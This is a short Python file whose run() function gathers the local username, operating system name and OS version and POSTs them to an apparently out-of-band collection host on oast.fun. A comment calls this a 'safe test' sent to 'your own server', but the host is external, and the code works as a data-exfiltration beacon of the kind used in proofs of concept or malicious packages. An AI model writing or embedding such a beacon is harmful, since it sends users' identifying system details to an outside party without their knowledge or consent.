import requests
import platform
import getpass

def run():
    import requests
    data = {
        "username": getpass.getuser(),
        "platform": platform.system(),
        "version": platform.version()
    }
    
    # Safe test: send to your own server
    try:
        response = requests.post("http://ubjbfddxsmjqevcfwfvm0uz5bh3njsgtc.oast.fun/collect", json=data)
        print("Server response:", response.text)
    except Exception as e:
        print("Failed to send data:", e)
